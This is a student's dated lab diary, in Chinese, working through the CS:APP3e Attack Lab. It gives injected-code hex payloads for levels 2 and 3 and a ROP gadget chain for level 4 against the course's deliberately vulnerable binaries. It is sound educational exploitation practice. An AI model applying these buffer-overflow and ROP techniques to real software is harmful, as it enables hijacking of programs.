11.10 开始

需要学习 CS: APP3e 书的 3.10.3 和 3.10.4 部分作为本实验室的参考资料，缓冲区溢出攻击可采用栈随机化

栈破坏检测 限制可执行代码区域这三种机制来限制

今天小摆



11.15

今天看了诸多博主做的level （一堆未见识过的 重定向之类的名词 加上枯燥的文档，让我难以自己做下去）

照葫芦画瓢的去做仍是出现一种 You caused a segmentation fault! 的错误



11.16 今天在线查了很多所谓segmentation fault! 的博客 没查出个所以然来

然后用WSL2原模原样的跑是没有产生这个问题的

今天小摆



11.20 虚拟机的突然崩溃 无法继续进行 ，明天开始WSL2的安装

今天弄了个WSL2 发现微软的好 把原先的virtual box删除了



11.23熟悉了WSL的操作

这周把这个lab解决



11.24

### level_2

这个阶段是调用给定的带参函数

通过注入少量代码

```c
1 void touch2(unsigned val)
2 {
3	 vlevel = 2; /* Part of validation protocol */
4 			if (val == cookie) {
5	 			printf("Touch2!: You called touch2(0x%.8x)\n", val);
6				validate(2);
								}
7 		 		else 	{
8 						printf("Misfire: You called touch2(0x%.8x)\n", val);
9 						fail(2);
10 						}
11 		exit(0);
12 }

```

函数的第一个参数是在寄存器 %rdi中传递的

思路就是 注入的代码应该将寄存器设置为cookie

然后利用ret指令将控制权转移到touch2中的第一个条指令

但不能使用jmp等跳转指令

参阅附录 b 中关于如何使用工具生成指令序列的字节级表示的讨论

也没有什么难度



1. 先把cookie的值移动到（movq） %rdi中

cookie的值在给定的文件中

2. 然后将touch2的第一条指令的地址压栈

通过gdb反汇编touch2函数后可以得到 0x00000000004017ec

3. 然后调用ret指令
4. 把汇编代码用 gcc -c xxx.s 编译成.o文件
5. 然后在gdb 反汇编获得这三条指令的字节表示





### level3

这次要传一个字符数组并与cookie的字符串表示进行比较

传字符数组就是传存字符串的首地址

但我们不能像level2 一样 直接把字符串放到getbuf的40个缓冲区上

因为这次巧妙的地方在于touch3里调用了一个函数

函数里在栈上开辟了一个很大的字符数组

然后用一个指针取截取随机的长度

然后用sprintf将cookie的值写到上面

这样做就覆盖了你想利用getbuf栈帧存储字符串的想法

所以我们只能将字符串放到别的地方（test函数的栈帧）

也就是用到getbuf返回地址（栈）之上

通过GDB得知 返回地址为	0x5561dc78 +0x24 

那我们在往栈底写八个字节（数组）



~~~c
48 c7 c7 a8 dc 61 55 68 <-- 这个数据保存在rsp位置（getbuf栈顶） 含有操作mov $string %rdi
fa 18 40 00 c3 00 00 00 										 pushq touch3
00 00 00 00 00 00 00 00											 ret (到)
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00 <-- 返回地址设置为getbuf的栈顶
35 39 62 39 39 37 66 61 <-- 字符串数据保存在test函数栈帧中  （栈底）
~~~





## Return-to-libc

### level_4

在rtarget上重复level2的事情

利用 给定的farm 找到可以用的gadget

不知道栈的地址

需要三个指令

popq %rax  （弹出八个字节给到rax	拿到cookie）

movq %rax ，%rdi	（传递给touch3参数）

ret	(调用touch3)

可能用到的函数都放在farm.c文件了

刚开始没注意到

想通过rtarget反汇编去找可用的代码段

结果发现不知道在哪里打断点

但farm.c 我们能直观利用的只是可以打断点的函数名罢了

我们还是要去gdb	rtarget

因为将farm.c编译成farm.s 再反汇编得到farm.d是不可行的

因为现在的gcc后得到的farm.d 让这个lab的两种攻击方法都不可行了

对比与level2 我们没用去使用明确的地址

而是利用现有的字节去构筑指令

然后利用寄存器去达到目的

~~~c
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00   /* 补齐至40 */
ab 19 40 00 00 00 00 00  /* popq rax 0x4019ab 0x4019a7 + 4 */
fa 97 b9 59 00 00 00 00  /* cookie 的值 */

a2 19 40 00 00 00 00 00  /* 0x4019a2  movq %rax, %rdi 0x4019a0 + 2 */
ec 17 40 00 00 00 00 00  /* touch2 4017ec */
~~~

## level_5

就是用ROP完成level3的任务

思路大致和4一致

就是所需的指令更多 更加复杂

引用文档话

~~~c
Before you take on the Phase 5, pause to consider what you have accomplished so far. In Phases 2 and 3, you caused a program to execute machine code of your own design. If CTARGET had been a network server, you could have injected your own code into a distant machine. In Phase 4, you circumvented two of the main devices modern systems use to thwart buffer overflow attacks. Although you did not inject your own code, you were able inject a type of program that operates by stitching together sequences of existing code. You have also gotten 95/100 points for the lab. That’s a good score. If you have other pressing obligations consider stopping right now.
Phase 5 requires you to do an ROP attack on RTARGET to invoke function touch3 with a pointer to a string representation of your cookie. That may not seem significantly more difficult than using an ROP attack to invoke touch2, except that we have made it so. Moreover, Phase 5 counts for only 5 points, which is not a true measure of the effort it will require. Think of it as more an extra credit problem for those who want to go beyond the normal expectations for the course.
~~~

暂时不考虑完成这个

2022-11-29完成lab
